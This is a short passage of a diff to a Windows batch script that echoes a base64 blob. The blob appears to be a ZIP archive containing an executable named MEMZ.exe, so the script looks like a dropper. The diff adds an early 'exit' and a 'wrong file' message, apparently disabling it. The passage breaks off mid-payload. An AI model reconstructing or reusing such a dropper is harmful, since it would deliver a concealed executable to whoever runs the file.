@@ -1,3 +1,6 @@
+exit 
+echo wrong file
+pause
 @echo off
 
 echo UEsDBBQAAAAIAIx46kjizcik+BYAAAAyAAAIAAAATUVNWi5leGXtWnt0XMV5Hz3sCCNba6Klgjjk>x
